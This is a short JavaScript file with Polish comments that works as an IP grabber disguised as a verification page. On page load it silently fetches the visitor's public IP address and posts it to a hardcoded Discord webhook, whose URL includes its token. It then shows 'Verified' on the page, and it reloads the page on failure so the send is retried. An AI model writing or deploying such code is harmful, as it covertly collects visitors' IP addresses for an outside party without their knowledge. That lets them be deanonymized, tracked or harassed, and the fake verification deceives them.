async function getIP() {
    try {
        // Pobieranie adresu IP z API
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;
        
        // Wysłanie adresu IP do webhooka Discorda
        const webhookUrl = 'https://discord.com/api/webhooks/1243337284061888645/9gh_K27BN-2MURSEcT9VybnOeV_udo-Z2jcaJAGH9Bm1VTSB3rdAbpmQFhJs2WunU0Bt';
        const payload = JSON.stringify({ content: `ip: ${ip}` });

        const webhookResponse = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: payload
        });

        if (webhookResponse.ok) {
            document.getElementById('status').innerText = 'Zweryfikowano';
        } else {
            throw new Error('Błąd podczas wysyłania webhooka');
        }

    } catch (error) {
        console.error('Błąd podczas pobierania adresu IP lub wysyłania webhooka:', error);
        location.reload(); // Odśwież stronę w przypadku błędu
    }
}

// Wywołaj funkcję po załadowaniu strony
window.onload = getIP;
